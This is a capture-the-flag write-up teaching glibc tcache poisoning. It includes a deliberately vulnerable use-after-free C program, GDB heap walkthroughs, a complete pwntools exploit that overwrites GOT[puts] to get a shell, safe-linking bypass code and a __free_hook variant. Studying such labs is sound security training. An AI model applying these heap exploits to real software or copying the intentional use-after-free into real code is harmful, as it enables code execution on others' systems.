---
title: "Pwn - Tcache Poisoning"
description: "Corrupting the glibc tcache freelist to gain arbitrary write — modern heap exploitation via fd pointer manipulation and GOT overwrite."
author: "Zemi"
---

## Challenge Info

| Detail     | Value                                    |
|------------|------------------------------------------|
| Category   | Binary Exploitation                      |
| Difficulty | Extreme                                  |
| Points     | 600                                      |
| Flag       | `zemi{tc4ch3_p01s0n_g0t_0v3rwr1t3}`     |

## Challenge Files

Download the challenge files to get started:

- [tcache.c](/Website/challenges/pwn-tcache-poison/tcache.c)
- [Makefile](/Website/challenges/pwn-tcache-poison/Makefile)
- [flag.txt](/Website/challenges/pwn-tcache-poison/flag.txt)

## Prerequisites

Before attempting this challenge, you should have completed:

- **Pwn - Buffer Overflow** — stack exploitation fundamentals
- **Pwn - Heap Overflow** — understanding heap chunk layout and metadata
- **Pwn - ROP Chains** — building ROP chains for code execution
- **Pwn - ret2libc** — calling libc functions and understanding GOT/PLT

You must understand how `malloc()` and `free()` work at the chunk level, what chunk headers look like, and what the GOT (Global Offset Table) is. If those are unclear, go back to the prerequisites.

## Introduction

The **tcache** (thread-local cache) was introduced in glibc 2.26 (2017) to speed up heap allocation. Before tcache, every `malloc()` and `free()` had to interact with the main arena, which required locking in multi-threaded programs. Tcache provides a per-thread cache of recently freed chunks, making allocation and deallocation faster.

But speed came at the cost of security. The original tcache implementation had almost **no integrity checks**. No double-free detection. No pointer validation. This made tcache a paradise for heap exploitation.

**Tcache poisoning** is the technique of corrupting the forward pointer (`fd`) of a freed tcache chunk to make `malloc()` return an arbitrary address. With that, we can write anywhere — overwrite a GOT entry, a function pointer, a hook — and redirect execution.

## How Tcache Works

### Structure Overview

Each thread has a `tcache_perthread_struct`:

```c
typedef struct tcache_perthread_struct {
    uint16_t counts[TCACHE_MAX_BINS];       // 64 bins, one per size
    tcache_entry *entries[TCACHE_MAX_BINS]; // head of each freelist
} tcache_perthread_struct;
```

There are 64 tcache bins, covering chunk sizes from 24 to 1032 bytes (in 16-byte increments on x86-64). Each bin is a singly-linked LIFO freelist holding up to 7 chunks.

### Tcache Entry Structure

When a chunk is freed into tcache, its user data area is overwritten with a `tcache_entry`:

```c
typedef struct tcache_entry {
    struct tcache_entry *next;    // forward pointer (fd)
    struct tcache_perthread_struct *key;  // tcache key (glibc 2.29+)
} tcache_entry;
```

The `next` pointer (also called `fd`) points to the next free chunk in the same bin. The `key` field (added in glibc 2.29) is used to detect double-frees.

### Free: Adding to Tcache

```
Before free(B):
  tcache bin [size 0x30]:  HEAD -> A -> NULL
  B is in use: [header | user data............]

After free(B):
  tcache bin [size 0x30]:  HEAD -> B -> A -> NULL
  B is freed:  [header | next=A | key=tcache | ...]
```

Free prepends the chunk to the bin's freelist (LIFO). The chunk's user data starts with the `next` pointer, which points to the previous head (A).

### Malloc: Removing from Tcache

```
Before malloc(0x28):  (requests size 0x30 after alignment)
  tcache bin [size 0x30]:  HEAD -> B -> A -> NULL

After malloc(0x28):
  tcache bin [size 0x30]:  HEAD -> A -> NULL
  Returns pointer to B's user data
```

Malloc removes the head of the freelist and returns it. The new head becomes whatever `B->next` pointed to.

### The Critical Observation

Malloc returns whatever address is at the head of the tcache freelist. If we can overwrite a freed chunk's `next` pointer to an arbitrary address, the freelist becomes:

```
HEAD -> B -> ARBITRARY_ADDRESS -> ???
```

First `malloc` returns B. Second `malloc` follows the `next` pointer and returns `ARBITRARY_ADDRESS`. We now have a pointer to anywhere in memory, and the next `malloc` of the same size will return that address. Writing to it gives us **arbitrary write**.

## The Tcache Poisoning Attack

### Step by Step

```
STEP 1: Allocate two chunks of the same size
  A = malloc(0x28)
  B = malloc(0x28)

STEP 2: Free both (they go into the same tcache bin)
  free(B)  ->  tcache: HEAD -> B -> NULL
  free(A)  ->  tcache: HEAD -> A -> B -> NULL

STEP 3: Use a UAF or overflow to overwrite A's next pointer
  A->next was B. We change it to TARGET_ADDRESS.
  tcache: HEAD -> A -> TARGET_ADDRESS -> ???

STEP 4: First malloc returns A (the head)
  C = malloc(0x28)  ->  returns A
  tcache: HEAD -> TARGET_ADDRESS -> ???

STEP 5: Second malloc returns TARGET_ADDRESS!
  D = malloc(0x28)  ->  returns TARGET_ADDRESS
  Now D points to our chosen address. Writing to D writes to TARGET_ADDRESS.

STEP 6: Write what we want through D
  memcpy(D, payload, ...)  ->  overwrites memory at TARGET_ADDRESS
```

### ASCII Diagram

```
=== After freeing A and B ===

tcache bin [0x30]:
  HEAD ─────> ┌──────────┐     ┌──────────┐
              │ Chunk A   │     │ Chunk B   │
              │ next ─────┼────>│ next ─────┼───> NULL
              │ key       │     │ key       │
              └──────────┘     └──────────┘

=== After overwriting A->next with GOT address ===

tcache bin [0x30]:
  HEAD ─────> ┌──────────┐     ┌──────────────────┐
              │ Chunk A   │     │ GOT[puts]         │
              │ next ─────┼────>│ 0x7f... (libc)    │
              │ key       │     │ ...               │
              └──────────┘     └──────────────────┘

=== After first malloc (returns A) ===

tcache bin [0x30]:
  HEAD ─────> ┌──────────────────┐
              │ GOT[puts]         │
              │ 0x7f... (libc)    │
              └──────────────────┘

=== After second malloc (returns GOT[puts]!) ===

  We now have a pointer to the GOT entry!
  Writing through it overwrites GOT[puts]!
```

## Vulnerable Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Compiled: gcc -no-pie -o tcache_poison tcache_poison.c
// (no-pie for fixed GOT addresses; ASLR still on for libc/stack)

struct note {
    char *data;
    size_t size;
};

struct note notes[10];
int note_count = 0;

void setup() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}

void create_note() {
    if (note_count >= 10) {
        puts("Too many notes!");
        return;
    }
    size_t size;
    printf("Size: ");
    scanf("%lu", &size);
    if (size > 0x400) {
        puts("Too large!");
        return;
    }
    notes[note_count].data = malloc(size);
    notes[note_count].size = size;
    printf("Data: ");
    read(0, notes[note_count].data, size);
    printf("Created note %d\n", note_count);
    note_count++;
}

void delete_note() {
    int idx;
    printf("Index: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >= note_count) {
        puts("Invalid index!");
        return;
    }
    free(notes[idx].data);
    // BUG: does not NULL the pointer! Use-after-free!
    printf("Deleted note %d\n", idx);
}

void edit_note() {
    int idx;
    printf("Index: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >= note_count) {
        puts("Invalid index!");
        return;
    }
    printf("Data: ");
    // BUG: still uses size from creation, and data pointer is not cleared
    // after free — this is a UAF write!
    read(0, notes[idx].data, notes[idx].size);
}

void view_note() {
    int idx;
    printf("Index: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >= note_count) {
        puts("Invalid index!");
        return;
    }
    printf("Note %d: ", idx);
    write(1, notes[idx].data, notes[idx].size);
    putchar('\n');
}

int win() {
    // Backup: for simpler exploitation path
    system("/bin/sh");
    return 0;
}

int main() {
    setup();
    printf("win() is at %p\n", win);

    while (1) {
        printf("\n1. Create note\n2. Delete note\n3. Edit note\n4. View note\n5. Exit\n> ");
        int choice;
        scanf("%d", &choice);
        switch (choice) {
            case 1: create_note(); break;
            case 2: delete_note(); break;
            case 3: edit_note(); break;
            case 4: view_note(); break;
            case 5: return 0;
            default: puts("Invalid choice!");
        }
    }
}
```

### The Bugs

1. **Use-After-Free (UAF)**: `delete_note()` frees the data pointer but does not set it to NULL. The `notes[idx]` struct still holds the old pointer and size.

2. **UAF Write**: `edit_note()` writes through the dangling pointer. After a chunk is freed, its user data contains tcache metadata (`next` and `key`). Writing through the UAF lets us overwrite the `next` pointer.

3. **UAF Read**: `view_note()` reads through the dangling pointer. After freeing, the chunk's user data contains heap pointers (the `next` pointer). Reading it leaks heap addresses.

### Compilation

```bash
gcc -no-pie -o tcache_poison tcache_poison.c
```

Protections:
- **NX enabled** — can't execute on stack/heap
- **No PIE** — fixed binary addresses (GOT is at a known location)
- **Partial RELRO** — GOT is writable
- **ASLR on** — libc addresses randomized (but we have a leak path)

## Exploitation Strategy

Our goal: overwrite GOT entry of `puts` with the address of `win()` so that calling `puts()` actually calls `win()` and gives us a shell.

```
1. Create two notes of the same size
2. Free both (they enter the same tcache bin)
3. Use UAF edit on the first-freed note to overwrite its next pointer
   with GOT[puts]
4. Malloc twice: first returns the freed chunk, second returns GOT[puts]
5. Write win()'s address through the second allocation
6. Next call to puts() calls win() instead -> shell
```

### Step-by-Step GDB Walkthrough

```bash
$ gdb -q ./tcache_poison
gef> break main
gef> run
win() is at 0x4012a7

# Create two notes of size 0x28
gef> # (interact with the menu)

# After creating note 0 and note 1:
gef> heap bins
─────────── Tcache Bins ───────────
[+] Tcache is empty

gef> heap chunks
Chunk(addr=0x405290, size=0x290, flags=PREV_INUSE)    [tcache_perthread_struct]
Chunk(addr=0x405520, size=0x30, flags=PREV_INUSE)     [note 0 data]
Chunk(addr=0x405550, size=0x30, flags=PREV_INUSE)     [note 1 data]

# Free note 1, then note 0:
gef> # delete note 1
gef> # delete note 0

gef> heap bins
─────────── Tcache Bins ───────────
[0x30] tcache[0](2): 0x405520 -> 0x405550 -> NULL
                      ^note 0     ^note 1

# The freelist: HEAD -> note0 -> note1 -> NULL
# note0's fd (next) pointer = 0x405550 (note1's address)

gef> x/4gx 0x405520
0x405520: 0x0000000000405550   <- next pointer (-> note1)
0x405528: 0x0000000000405010   <- tcache key
0x405530: 0x0000000000000000
0x405538: 0x0000000000000000

# Now we use UAF edit on note 0 to overwrite next pointer:
# We write the address of GOT[puts] instead of 0x405550

gef> # edit note 0, write p64(GOT_puts)
gef> x/4gx 0x405520
0x405520: 0x0000000000404018   <- next now points to GOT[puts]!
0x405528: 0x0000000000405010   <- key (we can optionally clear this)

gef> heap bins
─────────── Tcache Bins ───────────
[0x30] tcache[0](2): 0x405520 -> 0x404018 (GOT[puts]) -> ???

# First malloc(0x28) returns 0x405520 (note0, the head)
# Second malloc(0x28) returns 0x404018 (GOT[puts])!
# We write win()'s address to it.

gef> # create note with size 0x28 (returns note0)
gef> # create note with size 0x28 (returns GOT[puts]!)
gef> # write p64(win_addr) to it

gef> x/gx 0x404018
0x404018: 0x00000000004012a7   <- GOT[puts] now contains win()!

# Next time puts() is called, it jumps to win() -> system("/bin/sh")
```

## Dealing with Safe-Linking (glibc 2.32+)

Starting with glibc 2.32, tcache uses **safe-linking** (also called pointer mangling) to protect the `next` pointer. Instead of storing the raw pointer, it stores:

```
encrypted_next = (next_ptr) XOR (chunk_address >> 12)
```

This means you can't just write a raw address as the `next` pointer. You need to know (or leak) the heap address to compute the XOR mask.

### How to Bypass Safe-Linking

1. **Leak the heap address**: View a freed chunk to read its encrypted `next` pointer. If the chunk was the only one in the bin, `next = NULL`, so the encrypted value is `0 XOR (chunk_addr >> 12) = chunk_addr >> 12`. This directly leaks the heap address shifted right by 12 bits.

2. **Compute the mask**: `mask = chunk_addr >> 12`

3. **Encrypt your target**: `encrypted_target = target_addr XOR mask`

4. **Write the encrypted pointer** instead of the raw address.

```python
# Safe-linking bypass
def encrypt_ptr(target, chunk_addr):
    return target ^ (chunk_addr >> 12)

def decrypt_ptr(encrypted, chunk_addr):
    return encrypted ^ (chunk_addr >> 12)

# If we leaked the encrypted NULL (chunk was last in freelist):
# leaked_value = 0 ^ (chunk_addr >> 12) = chunk_addr >> 12
heap_base_approx = leaked_value << 12

# Now encrypt our target:
got_puts = 0x404018
encrypted = encrypt_ptr(got_puts, chunk_addr)
# Write encrypted value as the next pointer
```

### Dealing with the Tcache Key (glibc 2.29+)

The `key` field was added to detect double-frees. When a chunk is freed, `key` is set to a value derived from the tcache struct address. Before freeing, glibc checks if `key` matches — if it does, the chunk might already be free, and glibc aborts.

To bypass:
- When doing a UAF write to overwrite `next`, also overwrite `key` with any value that is NOT the tcache key. Writing zeros usually works.
- Alternatively, don't double-free. A UAF write does not trigger the key check because you are not calling `free()` again.

## Full Exploit

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./tcache_poison')
context.binary = elf

# Addresses (no PIE)
got_puts = elf.got['puts']

p = process('./tcache_poison')

# Parse win() address from binary output
p.recvuntil(b'win() is at ')
win_addr = int(p.recvline().strip(), 16)
log.success(f"win() = {hex(win_addr)}")
log.info(f"GOT[puts] = {hex(got_puts)}")

def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

def view(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.recvuntil(f'Note {idx}: '.encode())
    return p.recvline()[:-1]

# Step 1: Create two notes of the same size
log.info("Creating two notes...")
create(0x28, b'AAAA')   # note 0
create(0x28, b'BBBB')   # note 1

# Step 2: Free both (order matters for LIFO)
log.info("Freeing notes...")
delete(1)   # tcache: HEAD -> 1 -> NULL
delete(0)   # tcache: HEAD -> 0 -> 1 -> NULL

# Step 3: UAF edit on note 0 — overwrite next pointer with GOT[puts]
log.info(f"Poisoning tcache: overwriting fd with {hex(got_puts)}")
# On glibc < 2.32 (no safe-linking), write raw address:
edit(0, p64(got_puts))
# tcache: HEAD -> 0 -> GOT[puts] -> ???

# Step 4: First malloc consumes note 0 (the head)
log.info("First malloc to consume poisoned head...")
create(0x28, b'CCCC')   # note 2 — returns note 0's old chunk

# Step 5: Second malloc returns GOT[puts]!
log.info("Second malloc returns GOT[puts]...")
create(0x28, p64(win_addr))  # note 3 — returns GOT[puts], writes win() addr
# GOT[puts] now contains win()'s address

# Step 6: Trigger puts() — it calls win() instead
log.info("Triggering puts() -> win() -> system('/bin/sh')")
p.sendlineafter(b'> ', b'1')  # this will call puts() in the menu

p.interactive()
```

### Running the Exploit

```bash
$ python3 exploit.py
[*] '/home/user/tcache_poison'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] win() = 0x4012a7
[*] GOT[puts] = 0x404018
[*] Creating two notes...
[*] Freeing notes...
[*] Poisoning tcache: overwriting fd with 0x404018
[*] First malloc to consume poisoned head...
[*] Second malloc returns GOT[puts]...
[*] Triggering puts() -> win() -> system('/bin/sh')
[*] Switching to interactive mode
$ cat flag.txt
zemi{tc4ch3_p01s0n_g0t_0v3rwr1t3}
```

## Exploit Variant: Overwriting __free_hook (glibc < 2.34)

In glibc versions before 2.34, `__free_hook` is a function pointer that gets called every time `free()` is invoked. If we overwrite it with `system`, then calling `free(ptr)` where `ptr` points to `"/bin/sh"` gives us `system("/bin/sh")`.

```python
# Alternative approach using __free_hook (glibc < 2.34 only)
# This requires leaking libc base first

# Step 1: Leak libc via UAF read
delete(0)
leaked = u64(view(0).ljust(8, b'\x00'))
# On older glibc without safe-linking, this is a heap pointer.
# For libc leak, we need to free into unsorted bin (size > tcache max)

# Create a large chunk (> 0x408 to bypass tcache)
create(0x500, b'X' * 0x500)  # goes to unsorted bin on free
delete(large_idx)
# Now the chunk has fd/bk pointing into main_arena (libc)
leaked_libc = u64(view(large_idx).ljust(8, b'\x00'))
libc_base = leaked_libc - OFFSET_TO_MAIN_ARENA
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

# Step 2: Tcache poison to overwrite __free_hook
# (same technique as above but targeting free_hook instead of GOT)
edit(freed_chunk, p64(free_hook))
create(size, b'JUNK')
create(size, p64(system))   # __free_hook = system

# Step 3: free a chunk containing "/bin/sh"
create(0x28, b'/bin/sh\x00')
delete(that_chunk)   # free("/bin/sh") -> system("/bin/sh")
```

Note: `__free_hook` and `__malloc_hook` were **removed** in glibc 2.34. For modern exploitation, GOT overwrites (if RELRO is partial) or other techniques are needed.

## Tcache Internals Deep Dive

### Chunk Lifecycle

```
1. malloc(0x28)
   - Requested size: 0x28
   - Actual chunk size: 0x30 (0x28 + 8 header, aligned to 16)
   - Tcache checks bin for size 0x30
   - If bin has entries: remove head, return it
   - If bin is empty: fall through to normal malloc path

2. free(ptr)
   - Determine chunk size from header
   - If tcache bin for this size has < 7 entries:
     - Set chunk->next = current head
     - Set chunk->key = tcache key (glibc 2.29+)
     - Set bin head = chunk
     - Increment bin count
   - Else: fall through to normal free path (fastbin/unsorted bin)
```

### Memory Layout of a Freed Tcache Chunk

```
+-----------------------+ <- chunk start (returned by malloc - 0x10)
| prev_size    (8 bytes)|
+-----------------------+
| size | flags (8 bytes)|   0x31 (size=0x30, PREV_INUSE=1)
+-----------------------+ <- user data start (returned by malloc)
| next pointer (8 bytes)|   -> next free chunk or NULL
+-----------------------+
| key          (8 bytes)|   tcache key (glibc 2.29+)
+-----------------------+
| (unused user data)    |
| ...                   |
+-----------------------+
```

### Why Tcache Is So Exploitable

Compared to fastbins and other glibc freelists:

| Check                    | Fastbin        | Tcache (old)   | Tcache (2.29+) | Tcache (2.32+) |
|--------------------------|---------------|----------------|-----------------|-----------------|
| Double-free detection    | Partial       | None           | Key check       | Key check       |
| Size verification        | Yes           | None           | None            | None            |
| Pointer alignment check  | Yes           | None           | None            | None            |
| Pointer encryption       | No            | No             | No              | Safe-linking    |

Tcache sacrificed almost all integrity checks for speed. Even with the mitigations added in 2.29 and 2.32, tcache remains the easiest freelist to exploit.

## Common Pitfalls

### 1. Size Mismatch

The tcache bin is determined by chunk size, not by your requested size. If you `malloc(0x28)`, the chunk size is `0x30`. You must use the same `malloc` size when consuming the poisoned entry, or it will come from a different bin.

### 2. Tcache Count

Each bin holds at most 7 entries. If you free more than 7 chunks of the same size, the 8th goes to the regular fastbin or unsorted bin (which have stronger checks). Stay within the tcache limit.

### 3. Alignment Requirements

On glibc 2.32+ with safe-linking, `malloc` verifies that returned addresses are properly aligned (16-byte aligned on x86-64). If your target address is not aligned, the exploit fails with "malloc(): unaligned tcache chunk detected". Choose a target address that is 16-byte aligned.

### 4. GOT Alignment

GOT entries are 8-byte aligned but not always 16-byte aligned. If safe-linking is active, you may need to target a 16-byte-aligned address near the GOT entry and adjust your write offset accordingly.

### 5. Forgetting to Clear the Key

On glibc 2.29+, if you do a UAF write that only overwrites the `next` pointer (first 8 bytes) but leaves the `key` intact, a subsequent `free()` of that chunk will detect the key and abort with "free(): double free detected in tcache 2". Write at least 16 bytes to clear both `next` and `key`:

```python
edit(idx, p64(target_addr) + p64(0))  # clear key too
```

## Tools Used

| Tool       | Purpose                                         |
|------------|------------------------------------------------|
| GCC        | Compile the vulnerable binary                   |
| checksec   | Check protections (RELRO, PIE, NX, etc.)       |
| GDB + GEF  | Inspect heap state, tcache bins, chunk layout  |
| pwntools   | Build and send the exploit                      |
| patchelf   | Change libc version for testing different glibc |
| objdump    | Find GOT addresses                              |
| readelf    | Examine sections and symbols                    |

## Lessons Learned

1. **UAF is the king of heap bugs.** Use-after-free gives you both read and write access to freed chunk metadata. One UAF can unravel any heap allocator.

2. **Tcache is fast but fragile.** The design trade-off between performance and security is stark. Every mitigation added to tcache was in response to exploitation techniques that were trivial without them.

3. **GOT overwrite is the classic arbitrary-write target.** With Partial RELRO, the GOT is writable. Overwriting a frequently-called function's GOT entry with a controlled address gives you code execution the next time that function is called.

4. **Safe-linking is not a wall, it's a speed bump.** If you can leak any heap address, you can compute the XOR mask and encrypt your poisoned pointer. The mitigation raises the bar from "trivial" to "need one leak," which is usually achievable.

5. **Modern exploitation requires version awareness.** The technique differs significantly between glibc 2.27, 2.29, 2.32, and 2.34. Always check which glibc version you are targeting.

6. **Heap exploitation is a discipline.** Unlike stack overflows where one bug gives you RIP control, heap exploitation often requires chaining multiple primitives: a leak to defeat ASLR, a corruption to get arbitrary write, and a target to get code execution. Each step builds on the previous one.
